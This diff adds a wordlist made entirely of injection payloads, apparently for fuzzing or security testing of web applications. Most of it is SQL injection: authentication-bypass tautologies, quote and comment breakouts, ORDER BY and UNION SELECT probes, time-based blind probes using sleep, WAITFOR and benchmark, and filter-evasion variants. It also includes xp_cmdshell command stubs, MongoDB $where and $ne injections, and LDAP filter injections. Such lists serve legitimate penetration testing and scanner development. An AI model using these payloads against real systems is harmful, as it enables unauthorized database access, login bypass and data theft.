@@ -1,0 +1,1186 @@
+1
+2
+3
+99999999
+admin
+'
+9999999999999999999999
+-2
+3-1
+2-1
+#
+/*
+-- -
+;%00
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+''
+'-'
+--
+'--+
+; --
+'; --
+'); --
+!
+" "
+" #
+" --
+``
+,
+""
+/
+//
+\
+\\
+'
+"
+#
+-
+--
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+;
+-
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+"--##
+'--##
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+" OR 1 = 2 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+'"`)\/&||/**/--+#%0d%0atest
+', ",'),"), (),., * /, &lt;! -, -
+or #
+')--+#/**/
+' and '1'='1
+' AND 1  --+
+' and '1'='0
+' AND 0  --+
+or 1=1--+#
+'+OR+1=1--
+' or 1=1 #
+'--' OR 1 = 1 --
+%0a or 1=1
+0 or 1=1 --
+0 or 1=1 %23
+' and '1'='1' #
+'/**/or
+HAVING 1=0--
+AND 1=1
+AND 1=0
+AND 1=1--
+AND 1=0--
+AND 1=1#
+AND 1=0#
+AND 1=1 AND '%'='
+AND 1=0 AND '%'='
+'/**/or/**/'1'/**/=/**/'1
+1' ORdeR By 1--+
+1' ORdeR By 2--+
+1' ORdeR By 3--+
+1' ORdeR By 1,2--+
+1' ORDER By 1,2,3--+
+1' GROUP By 1,2,--+
+1' GROUP By 1,2,3--+
+' oR '1'='1  
+' oR 1=1;-- 
+' oR 1=2;--  
+' oR 1=1;#  
+') oR ('x'='x  
+' Or 1=1 LIMIT 1;--  
+'+oR+1=1--+##
+' AND '1'='1
+' AnD '1'='2
+' orDEr bY 1+--+#
+' orDEr bY 2+--+#
+' orDEr bY 3+--+#
+' orDEr bY 4+--+#
+'|| (seLEct '') ||'
+'|| (seLect '' froM dUal) ||'
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/' GROUP BY columnnames having 1=1 --
+-1' UNION SELECT 1,2,3--+
+' UNION SELECT sum(columnname ) from tablename --
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+1 AND (SELECT * FROM Users) = 1
+' AND MID(VERSION(),1,1) = '5';
+1' + sleep(5)
+1' and sleep(5)
+1' && sleep(5)
+1' | sleep(5)
+1' || pg_sleep(5)
+1' WAITFOR DELAY '0:0:5'
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',5)
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+sleep(__TIME__)#
+1 or sleep(__TIME__)#
+" or sleep(__TIME__)#
+' or sleep(__TIME__)#
+" or sleep(__TIME__)="
+' or sleep(__TIME__)='
+1) or sleep(__TIME__)#
+") or sleep(__TIME__)="
+') or sleep(__TIME__)='
+1)) or sleep(__TIME__)#
+")) or sleep(__TIME__)="
+')) or sleep(__TIME__)='
+;waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'--
+';waitfor delay '0:0:__TIME__'--
+";waitfor delay '0:0:__TIME__'--
+');waitfor delay '0:0:__TIME__'--
+");waitfor delay '0:0:__TIME__'--
+));waitfor delay '0:0:__TIME__'--
+'));waitfor delay '0:0:__TIME__'--
+"));waitfor delay '0:0:__TIME__'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+1 or 1 = 1
+1 or 1 = 1 -- -
+1 or 1 = 1 #
+1 or 1 = 1 /*
+1) or (1 = 1
+1) or (1 = 1 -- -
+1) or (1 = 1 #
+1) or (1 = 1 /*
+1) or (1) = (1
+1) or (1) = (1 -- -
+1) or (1) = (1 #
+1) or (1) = (1 /*
+1 -- -
+1 #
+1 /*
+1) -- -
+1) #
+1) /*
+' or '1' = '1
+' or '1' = '1' -- -
+' or '1' = '1' #
+' or '1' = '1' /*
+') or ('1' = '1
+') or ('1') = ('1
+" or "1" = "1
+") or ("1" = "1
+") or ("1") = ("1
+' -- -
+" -- -
+' #
+' /*
+" /*
+') -- -
+") -- -
+') #
+") #
+') /*
+") /*
+')) -- -
+")) -- -
+')) #
+")) #
+')) /*
+")) /*
+) -- -
+) #
+) /*
+)) -- -
+)) #
+)) /*
+' and '1' = '1
+' and '1' = '1' -- -
+' and '1' = '1' #
+' and '1' = '1' /*
+') and ('1' = '1
+') and ('1') = ('1
+" and "1" = "1
+") and ("1" = "1
+") and ("1") = ("1
+1 and 1 = 1
+1 and 1 = 1 -- -
+1 and 1 = 1 #
+1 and 1 = 1 /*
+1) and (1 = 1
+1) and (1 = 1 -- -
+1) and (1 = 1 #
+1) and (1 = 1 /*
+1) and (1) = (1
+1) and (1) = (1 -- -
+1) and (1) = (1 #
+1) and (1) = (1 /*
+' || '1' = '1
+' || '1' = '1' -- -
+' || '1' = '1' #
+' || '1' = '1' /*
+') || ('1' = '1
+') || ('1') = ('1
+" || "1" = "1
+") || ("1" = "1
+") || ("1") = ("1
+1 || 1 = 1
+1 || 1 = 1 -- -
+1 || 1 = 1 #
+1 || 1 = 1 /*
+1) || (1 = 1
+1) || (1 = 1 -- -
+1) || (1 = 1 #
+1) || (1 = 1 /*
+1) || (1) = (1
+1) || (1) = (1 -- -
+1) || (1) = (1 #
+1) || (1) = (1 /*
+' && '1' = '1
+' && '1' = '1' -- -
+' && '1' = '1' #
+' && '1' = '1' /*
+') && ('1' = '1
+') && ('1') = ('1
+" && "1" = "1
+") && ("1" = "1
+") && ("1") = ("1
+1 && 1 = 1
+1 && 1 = 1 -- -
+1 && 1 = 1 #
+1 && 1 = 1 /*
+1) && (1 = 1
+1) && (1 = 1 -- -
+1) && (1 = 1 #
+1) && (1 = 1 /*
+1) && (1) = (1
+1) && (1) = (1 -- -
+1) && (1) = (1 #
+1) && (1) = (1 /*
+' orDeR by 1 -- -
+' orDeR by 1 #
+' orDeR by 1 /*
+' orDeR by 1337 -- -
+' ordeR by 1337 #
+' ordeR by 1337 /*
+" orDeR by 1 -- -
+" orDeR by 1 #
+" orDeR by 1 /*
+" orDeR by 1337 -- -
+" ordeR by 1337 #
+" ordeR by 1337 /*
+') orDeR by 1 -- -
+') orDeR by 1 #
+') orDeR by 1 /*
+') orDeR by 1337 -- -
+') ordeR by 1337 #
+') ordeR by 1337 /*
+") orDeR by 1 -- -
+") orDeR by 1 #
+") orDeR by 1 /*
+") orDeR by 1337 -- -
+") ordeR by 1337 #
+") ordeR by 1337 /*
+' orORDeRdeR by 1 -- -
+' orORDeRdeR by 1 #
+' orORDeRdeR by 1 /*
+' orORDeRdeR by 1337 -- -
+' orORDeRdeR by 1337 #
+' orORDeRdeR by 1337 /*
+" orORDeRdeR by 1 -- -
+" orORDeRdeR by 1 #
+" orORDeRdeR by 1 /*
+" orORDeRdeR by 1337 -- -
+" orORDeRdeR by 1337 #
+" orORDeRdeR by 1337 /*
+') orORDeRdeR by 1 -- -
+') orORDeRdeR by 1 #
+') orORDeRdeR by 1 /*
+') orORDeRdeR by 1337 -- -
+') orORDeRdeR by 1337 #
+') orORDeRdeR by 1337 /*
+") orORDeRdeR by 1 -- -
+") orORDeRdeR by 1 #
+") orORDeRdeR by 1 /*
+") orORDeRdeR by 1337 -- -
+") orORDeRdeR by 1337 #
+") orORDeRdeR by 1337 /*'
+' /*!ORDER BY*/ 1 -- -
+' /*!ORDER BY*/ 1 #
+' /*!ORDER BY*/ 1 /*
+' /*!ORDER BY*/ 1337 -- -
+' /*!ORDER BY*/ 1337 #
+' /*!ORDER BY*/ 1337 /*
+" /*!ORDER BY*/ 1 -- -
+" /*!ORDER BY*/ 1 #
+" /*!ORDER BY*/ 1 /*
+" /*!ORDER BY*/ 1337 -- -
+" /*!ORDER BY*/ 1337 #
+" /*!ORDER BY*/ 1337 /*
+') /*!ORDER BY*/ 1 -- -
+') /*!ORDER BY*/ 1 #
+') /*!ORDER BY*/ 1 /*
+') /*!ORDER BY*/ 1337 -- -
+') /*!ORDER BY*/ 1337 #
+') /*!ORDER BY*/ 1337 /*
+") /*!ORDER BY*/ 1 -- -
+") /*!ORDER BY*/ 1 #
+") /*!ORDER BY*/ 1 /*
+") /*!ORDER BY*/ 1337 -- -
+") /*!ORDER BY*/ 1337 #
+") /*!ORDER BY*/ 1337 /*
+' /*!50000ORDER*//**//*!50000BY*/ 1 -- -
+' /*!50000ORDER*//**//*!50000BY*/ 1 #
+' /*!50000ORDER*//**//*!50000BY*/ 1 /*
+' /*!50000ORDER*//**//*!50000BY*/ 1337 -- -
+' /*!50000ORDER*//**//*!50000BY*/ 1337 #
+' /*!50000ORDER*//**//*!50000BY*/ 1337 /*
+" /*!50000ORDER*//**//*!50000BY*/ 1 -- -
+" /*!50000ORDER*//**//*!50000BY*/ 1 #
+" /*!50000ORDER*//**//*!50000BY*/ 1 /*
+" /*!50000ORDER*//**//*!50000BY*/ 1337 -- -
+" /*!50000ORDER*//**//*!50000BY*/ 1337 #
+" /*!50000ORDER*//**//*!50000BY*/ 1337 /*
+') /*!50000ORDER*//**//*!50000BY*/ 1 -- -
+') /*!50000ORDER*//**//*!50000BY*/ 1 #
+') /*!50000ORDER*//**//*!50000BY*/ 1 /*
+') /*!50000ORDER*//**//*!50000BY*/ 1337 -- -
+') /*!50000ORDER*//**//*!50000BY*/ 1337 #
+') /*!50000ORDER*//**//*!50000BY*/ 1337 /*
+") /*!50000ORDER*//**//*!50000BY*/ 1 -- -
+") /*!50000ORDER*//**//*!50000BY*/ 1 #
+") /*!50000ORDER*//**//*!50000BY*/ 1 /*
+") /*!50000ORDER*//**//*!50000BY*/ 1337 -- -
+") /*!50000ORDER*//**//*!50000BY*/ 1337 #
+") /*!50000ORDER*//**//*!50000BY*/ 1337 /*
+' oR sleep(5) -- -
+' oR sleep(5) #
+' oR sleep(5) /*
+' AnD sleep(5) -- -
+' AnD sleep(5) #
+' AnD sleep(5) /*
+') AnD sleep(5) -- -
+') AnD sleep(5) #
+') AnD sleep(5) /*
+" oR sleep(5) -- -
+" oR sleep(5) #
+" oR sleep(5) /*
+" AnD sleep(5) -- -
+" AnD sleep(5) #
+" AnD sleep(5) /*
+") AnD sleep(5) -- -
+") AnD sleep(5) #
+") AnD sleep(5) /*
+' = '1' aNd sleep(4) anD '1' = '1
+' = '2' Or sleep(4) anD '1' = '1
+" = "1" aNd sleep(4) anD "1" = "1
+" = "2" Or sleep(4) anD "1" = "1
+' = '1' aNd sleep(4) anD '1' = '1' -- -
+' = '2' Or sleep(4) anD '1' = '1' -- -
+' = '1' aNd sleep(4) anD '1' = '1' #
+' = '2' Or sleep(4) anD '1' = '1' #
+' = '1' aNd sleep(4) anD '1' = '1' /*
+' = '2' Or sleep(4) anD '1' = '1' /*
+" = "1" aNd sleep(4) anD "1" = "1" -- -
+" = "2" Or sleep(4) anD "1" = "1" -- -
+" = "1" aNd sleep(4) anD "1" = "1" #
+" = "2" Or sleep(4) anD "1" = "1" #
+" = "1" aNd sleep(4) anD "1" = "1" /*
+" = "2" Or sleep(4) anD "1" = "1" /*
+1 = 1 aNd sleep(4) anD 1 = 1
+1 = 2 Or sleep(4) anD 1 = 1
+1 = 1 aNd sleep(4) anD '1' = '1' -- -
+1 = 2 Or sleep(4) anD '1' = '1' -- -
+1 = 1 aNd sleep(4) anD '1' = '1' #
+1 = 2 Or sleep(4) anD '1' = '1' #
+1 = 1 aNd sleep(4) anD '1' = '1' /*
+1 = 2 Or sleep(4) anD '1' = '1' /*
+1 aNd sleep(4) -- -
+1 aNd sleep(4) #
+1 aNd sleep(4) /*
+1 Or sleep(4) -- -
+1 Or sleep(4) #
+1 Or sleep(4) /*
+' || sleep(5) -- -
+' || sleep(5) #
+' || sleep(5) /*
+' && sleep(5) -- -
+' && sleep(5) #
+' && sleep(5) /*
+') && sleep(5) -- -
+') && sleep(5) #
+') && sleep(5) /*
+" || sleep(5) -- -
+" || sleep(5) #
+" || sleep(5) /*
+" && sleep(5) -- -
+" && sleep(5) #
+" && sleep(5) /*
+") && sleep(5) -- -
+") && sleep(5) #
+") && sleep(5) /*
+' = '1' && sleep(4) && '1' = '1
+' = '2' || sleep(4) && '1' = '1
+" = "1" && sleep(4) && "1" = "1
+" = "2" || sleep(4) && "1" = "1
+' = '1' && sleep(4) && '1' = '1' -- -
+' = '2' || sleep(4) && '1' = '1' -- -
+' = '1' && sleep(4) && '1' = '1' #
+' = '2' || sleep(4) && '1' = '1' #
+' = '1' && sleep(4) && '1' = '1' /*
+' = '2' || sleep(4) && '1' = '1' /*
+" = "1" && sleep(4) && "1" = "1" -- -
+" = "2" || sleep(4) && "1" = "1" -- -
+" = "1" && sleep(4) && "1" = "1" #
+" = "2" || sleep(4) && "1" = "1" #
+" = "1" && sleep(4) && "1" = "1" /*
+" = "2" || sleep(4) && "1" = "1" /*
+1 = 1 && sleep(4) && 1 = 1
+1 = 2 || sleep(4) && 1 = 1
+1 = 1 && sleep(4) && '1' = '1' -- -
+1 = 2 || sleep(4) && '1' = '1' -- -
+1 = 1 && sleep(4) && '1' = '1' #
+1 = 2 || sleep(4) && '1' = '1' #
+1 = 1 && sleep(4) && '1' = '1' /*
+1 = 2 || sleep(4) && '1' = '1' /*
+1 && sleep(4) -- -
+1 && sleep(4) #
+1 && sleep(4) /*
+1 || sleep(4) -- -
+1 || sleep(4) #
+1 || sleep(4) /*
+--+-
+1+or+1+=+1
+1+or+1+=+1+--+-
+1+or+1+=+1+#
+1+or+1+=+1+/*
+1)+or+(1+=+1
+1)+or+(1+=+1+--+-
+1)+or+(1+=+1+#
+1)+or+(1+=+1+/*
+1)+or+(1)+=+(1
+1)+or+(1)+=+(1+--+-
+1)+or+(1)+=+(1+#
+1)+or+(1)+=+(1+/*
+1+--+-
+1+#
+1+/*
+1)+--+-
+1)+#
+1)+/*
+'+or+'1'+=+'1
+'+or+'1'+=+'1'+--+-
+'+or+'1'+=+'1'+#
+'+or+'1'+=+'1'+/*
+')+or+('1'+=+'1
+')+or+('1')+=+('1
+"+or+"1"+=+"1
+")+or+("1"+=+"1
+")+or+("1")+=+("1
+'+--+-
+"+--+-
+'+#
+"+#
+'+/*
+"+/*
+')+--+-
+")+--+-
+')+#
+")+#
+')+/*
+")+/*
+'))+--+-
+"))+--+-
+'))+#
+"))+#
+'))+/*
+"))+/*
+)+--+-
+)+#
+)+/*
+))+--+-
+))+#
+))+/*
+'+and+'1'+=+'1
+'+and+'1'+=+'1'+--+-
+'+and+'1'+=+'1'+#
+'+and+'1'+=+'1'+/*
+')+and+('1'+=+'1
+')+and+('1')+=+('1
+"+and+"1"+=+"1
+")+and+("1"+=+"1
+")+and+("1")+=+("1
+1+and+1+=+1
+1+and+1+=+1+--+-
+1+and+1+=+1+#
+1+and+1+=+1+/*
+1)+and+(1+=+1
+1)+and+(1+=+1+--+-
+1)+and+(1+=+1+#
+1)+and+(1+=+1+/*
+1)+and+(1)+=+(1
+1)+and+(1)+=+(1+--+-
+1)+and+(1)+=+(1+#
+1)+and+(1)+=+(1+/*
+'+||+'1'+=+'1
+'+||+'1'+=+'1'+--+-
+'+||+'1'+=+'1'+#
+'+||+'1'+=+'1'+/*
+')+||+('1'+=+'1
+')+||+('1')+=+('1
+"+||+"1"+=+"1
+")+||+("1"+=+"1
+")+||+("1")+=+("1
+1+||+1+=+1
+1+||+1+=+1+--+-
+1+||+1+=+1+#
+1+||+1+=+1+/*
+1)+||+(1+=+1
+1)+||+(1+=+1+--+-
+1)+||+(1+=+1+#
+1)+||+(1+=+1+/*
+1)+||+(1)+=+(1
+1)+||+(1)+=+(1+--+-
+1)+||+(1)+=+(1+#
+1)+||+(1)+=+(1+/*
+'+&&+'1'+=+'1
+'+&&+'1'+=+'1'+--+-
+'+&&+'1'+=+'1'+#
+'+&&+'1'+=+'1'+/*
+')+&&+('1'+=+'1
+')+&&+('1')+=+('1
+"+&&+"1"+=+"1
+")+&&+("1"+=+"1
+")+&&+("1")+=+("1
+1+&&+1+=+1
+1+&&+1+=+1+--+-
+1+&&+1+=+1+#
+1+&&+1+=+1+/*
+1)+&&+(1+=+1
+1)+&&+(1+=+1+--+-
+1)+&&+(1+=+1+#
+1)+&&+(1+=+1+/*
+1)+&&+(1)+=+(1
+1)+&&+(1)+=+(1+--+-
+1)+&&+(1)+=+(1+#
+1)+&&+(1)+=+(1+/*
+'+orDeR+by+1+--+-
+'+orDeR+by+1+#
+'+orDeR+by+1+/*
+'+orDeR+by+1337+--+-
+'+ordeR+by+1337+#
+'+ordeR+by+1337+/*
+"+orDeR+by+1+--+-
+"+orDeR+by+1+#
+"+orDeR+by+1+/*
+"+orDeR+by+1337+--+-
+"+ordeR+by+1337+#
+"+ordeR+by+1337+/*
+')+orDeR+by+1+--+-
+')+orDeR+by+1+#
+')+orDeR+by+1+/*
+')+orDeR+by+1337+--+-
+')+ordeR+by+1337+#
+')+ordeR+by+1337+/*
+")+orDeR+by+1+--+-
+")+orDeR+by+1+#
+")+orDeR+by+1+/*
+")+orDeR+by+1337+--+-
+")+ordeR+by+1337+#
+")+ordeR+by+1337+/*
+'+orORDeRdeR+by+1+--+-
+'+orORDeRdeR+by+1+#
+'+orORDeRdeR+by+1+/*
+'+orORDeRdeR+by+1337+--+-
+'+orORDeRdeR+by+1337+#
+'+orORDeRdeR+by+1337+/*
+"+orORDeRdeR+by+1+--+-
+"+orORDeRdeR+by+1+#
+"+orORDeRdeR+by+1+/*
+"+orORDeRdeR+by+1337+--+-
+"+orORDeRdeR+by+1337+#
+"+orORDeRdeR+by+1337+/*
+')+orORDeRdeR+by+1+--+-
+')+orORDeRdeR+by+1+#
+')+orORDeRdeR+by+1+/*
+')+orORDeRdeR+by+1337+--+-
+')+orORDeRdeR+by+1337+#
+')+orORDeRdeR+by+1337+/*
+")+orORDeRdeR+by+1+--+-
+")+orORDeRdeR+by+1+#
+")+orORDeRdeR+by+1+/*
+")+orORDeRdeR+by+1337+--+-
+")+orORDeRdeR+by+1337+#
+")+orORDeRdeR+by+1337+/*'
+'+/*!ORDER+BY*/+1+--+-
+'+/*!ORDER+BY*/+1+#
+'+/*!ORDER+BY*/+1+/*
+'+/*!ORDER+BY*/+1337+--+-
+'+/*!ORDER+BY*/+1337+#
+'+/*!ORDER+BY*/+1337+/*
+"+/*!ORDER+BY*/+1+--+-
+"+/*!ORDER+BY*/+1+#
+"+/*!ORDER+BY*/+1+/*
+"+/*!ORDER+BY*/+1337+--+-
+"+/*!ORDER+BY*/+1337+#
+"+/*!ORDER+BY*/+1337+/*
+')+/*!ORDER+BY*/+1+--+-
+')+/*!ORDER+BY*/+1+#
+')+/*!ORDER+BY*/+1+/*
+')+/*!ORDER+BY*/+1337+--+-
+')+/*!ORDER+BY*/+1337+#
+')+/*!ORDER+BY*/+1337+/*
+")+/*!ORDER+BY*/+1+--+-
+")+/*!ORDER+BY*/+1+#
+")+/*!ORDER+BY*/+1+/*
+")+/*!ORDER+BY*/+1337+--+-
+")+/*!ORDER+BY*/+1337+#
+")+/*!ORDER+BY*/+1337+/*
+'+/*!50000ORDER*//**//*!50000BY*/+1+--+-
+'+/*!50000ORDER*//**//*!50000BY*/+1+#
+'+/*!50000ORDER*//**//*!50000BY*/+1+/*
+'+/*!50000ORDER*//**//*!50000BY*/+1337+--+-
+'+/*!50000ORDER*//**//*!50000BY*/+1337+#
+'+/*!50000ORDER*//**//*!50000BY*/+1337+/*
+"+/*!50000ORDER*//**//*!50000BY*/+1+--+-
+"+/*!50000ORDER*//**//*!50000BY*/+1+#
+"+/*!50000ORDER*//**//*!50000BY*/+1+/*
+"+/*!50000ORDER*//**//*!50000BY*/+1337+--+-
+"+/*!50000ORDER*//**//*!50000BY*/+1337+#
+"+/*!50000ORDER*//**//*!50000BY*/+1337+/*
+')+/*!50000ORDER*//**//*!50000BY*/+1+--+-
+')+/*!50000ORDER*//**//*!50000BY*/+1+#
+')+/*!50000ORDER*//**//*!50000BY*/+1+/*
+')+/*!50000ORDER*//**//*!50000BY*/+1337+--+-
+')+/*!50000ORDER*//**//*!50000BY*/+1337+#
+')+/*!50000ORDER*//**//*!50000BY*/+1337+/*
+")+/*!50000ORDER*//**//*!50000BY*/+1+--+-
+")+/*!50000ORDER*//**//*!50000BY*/+1+#
+")+/*!50000ORDER*//**//*!50000BY*/+1+/*
+")+/*!50000ORDER*//**//*!50000BY*/+1337+--+-
+")+/*!50000ORDER*//**//*!50000BY*/+1337+#
+")+/*!50000ORDER*//**//*!50000BY*/+1337+/*
+'+oR+sleep(5)+--+-
+'+oR+sleep(5)+#
+'+oR+sleep(5)+/*
+'+AnD+sleep(5)+--+-
+'+AnD+sleep(5)+#
+'+AnD+sleep(5)+/*
+')+AnD+sleep(5)+--+-
+')+AnD+sleep(5)+#
+')+AnD+sleep(5)+/*
+"+oR+sleep(5)+--+-
+"+oR+sleep(5)+#
+"+oR+sleep(5)+/*
+"+AnD+sleep(5)+--+-
+"+AnD+sleep(5)+#
+"+AnD+sleep(5)+/*
+")+AnD+sleep(5)+--+-
+")+AnD+sleep(5)+#
+")+AnD+sleep(5)+/*
+'+=+'1'+aNd+sleep(4)+anD+'1'+=+'1
+'+=+'2'+Or+sleep(4)+anD+'1'+=+'1
+"+=+"1"+aNd+sleep(4)+anD+"1"+=+"1
+"+=+"2"+Or+sleep(4)+anD+"1"+=+"1
+'+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+--+-
+'+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+--+-
+'+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+#
+'+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+#
+'+=+'1'+aNd+sleep(4)+anD+'1'+=+'1'+/*
+'+=+'2'+Or+sleep(4)+anD+'1'+=+'1'+/*
+"+=+"1"+aNd+sleep(4)+anD+"1"+=+"1"+--+-
+"+=+"2"+Or+sleep(4)+anD+"1"+=+"1"+--+-
+"+=+"1"+aNd+sleep(4)+anD+"1"+=+"1"+#
+"+=+"2"+Or+sleep(4)+anD+"1"+=+"1"+#
+"+=+"1"+aNd+sleep(4)+anD+"1"+=+"1"+/*
+"+=+"2"+Or+sleep(4)+anD+"1"+=+"1"+/*
+1+=+1+aNd+sleep(4)+anD+1+=+1
+1+=+2+Or+sleep(4)+anD+1+=+1
+1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+--+-
+1+=+2+Or+sleep(4)+anD+'1'+=+'1'+--+-
+1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+#
+1+=+2+Or+sleep(4)+anD+'1'+=+'1'+#
+1+=+1+aNd+sleep(4)+anD+'1'+=+'1'+/*
+1+=+2+Or+sleep(4)+anD+'1'+=+'1'+/*
+1+aNd+sleep(4)+--+-
+1+aNd+sleep(4)+#
+1+aNd+sleep(4)+/*
+1+Or+sleep(4)+--+-
+1+Or+sleep(4)+#
+1+Or+sleep(4)+/*
+'+||+sleep(5)+--+-
+'+||+sleep(5)+#
+'+||+sleep(5)+/*
+'+&&+sleep(5)+--+-
+'+&&+sleep(5)+#
+'+&&+sleep(5)+/*
+')+&&+sleep(5)+--+-
+')+&&+sleep(5)+#
+')+&&+sleep(5)+/*
+"+||+sleep(5)+--+-
+"+||+sleep(5)+#
+"+||+sleep(5)+/*
+"+&&+sleep(5)+--+-
+"+&&+sleep(5)+#
+"+&&+sleep(5)+/*
+")+&&+sleep(5)+--+-
+")+&&+sleep(5)+#
+")+&&+sleep(5)+/*
+'+=+'1'+&&+sleep(4)+&&+'1'+=+'1
+'+=+'2'+||+sleep(4)+&&+'1'+=+'1
+"+=+"1"+&&+sleep(4)+&&+"1"+=+"1
+"+=+"2"+||+sleep(4)+&&+"1"+=+"1
+'+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+--+-
+'+=+'2'+||+sleep(4)+&&+'1'+=+'1'+--+-
+'+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+#
+'+=+'2'+||+sleep(4)+&&+'1'+=+'1'+#
+'+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+/*
+'+=+'2'+||+sleep(4)+&&+'1'+=+'1'+/*
+"+=+"1"+&&+sleep(4)+&&+"1"+=+"1"+--+-
+"+=+"2"+||+sleep(4)+&&+"1"+=+"1"+--+-
+"+=+"1"+&&+sleep(4)+&&+"1"+=+"1"+#
+"+=+"2"+||+sleep(4)+&&+"1"+=+"1"+#
+"+=+"1"+&&+sleep(4)+&&+"1"+=+"1"+/*
+"+=+"2"+||+sleep(4)+&&+"1"+=+"1"+/*
+1+=+1+&&+sleep(4)+&&+1+=+1
+1+=+2+||+sleep(4)+&&+1+=+1
+1+=+1+&&+sleep(4)+&&+'1'+=+'1'+--+-
+1+=+2+||+sleep(4)+&&+'1'+=+'1'+--+-
+1+=+1+&&+sleep(4)+&&+'1'+=+'1'+#
+1+=+2+||+sleep(4)+&&+'1'+=+'1'+#
+1+=+1+&&+sleep(4)+&&+'1'+=+'1'+/*
+1+=+2+||+sleep(4)+&&+'1'+=+'1'+/*
+1+&&+sleep(4)+--+-
+1+&&+sleep(4)+#
+1+&&+sleep(4)+/*
+1+||+sleep(4)+--+-
+1+||+sleep(4)+#
+1+||+sleep(4)+/*
+'; SeleCT 1 -- -
+"; SeleCT 1 -- -
+'); SeleCT 1 -- -
+"); SeleCT 1 -- -
+')); SeleCT 1 -- -
+")); SeleCT 1 -- -
+'; SeleCT 1 #
+"; SeleCT 1 #
+'); SeleCT 1 #
+"); SeleCT 1 #
+')); SeleCT 1 #
+")); SeleCT 1 #
+'; SeleCT 1 /*
+"; SeleCT 1 /*
+'); SeleCT 1 /*
+"); SeleCT 1 /*
+')); SeleCT 1 /*
+")); SeleCT 1 /*
+';+SeleCT+1+--+-
+";+SeleCT+1+--+-
+');+SeleCT+1+--+-
+");+SeleCT+1+--+-
+'));+SeleCT+1+--+-
+"));+SeleCT+1+--+-
+';+SeleCT+1+#
+";+SeleCT+1+#
+');+SeleCT+1+#
+");+SeleCT+1+#
+'));+SeleCT+1+#
+"));+SeleCT+1+#
+';+SeleCT+1+/*
+";+SeleCT+1+/*
+');+SeleCT+1+/*
+");+SeleCT+1+/*
+'));+SeleCT+1+/*
+"));+SeleCT+1+/*
+abraca+dabra'"`)}];/*--+-#%00%0A
+/*…*/
++
+||
+%
+@variable
+@@variable
+1002' or '1'='1
+1002' and '1'='1
+1002' and '1'='2
+""""
+' oR 1=1--+#
+' OrDER bY 0 --+#
+' OrDER bY 1 --+#
+' OrDER bY 2 --+#
+' OrDER bY 3 --+#
+' OrDER bY 4 --+#
+' OrDER bY 5 --+#
+' OrDER bY 6 --+#
+' OrDER bY 7 --+#
+' OrDER bY 8 --+#
+' OrDER bY 9 --+#
+' OrDER by 10 --+#
+0940930430924093' OrDER bY 0 --+#
+0940930430924093' OrDER bY 1 --+#
+0940930430924093' OrDER bY 2 --+#
+0940930430924093' OrDER bY 3 --+#
+0940930430924093' OrDER bY 4 --+#
+0940930430924093' OrDER bY 5 --+#
+0940930430924093' OrDER bY 6 --+#
+0940930430924093' OrDER bY 7 --+#
+0940930430924093' OrDER bY 8 --+#
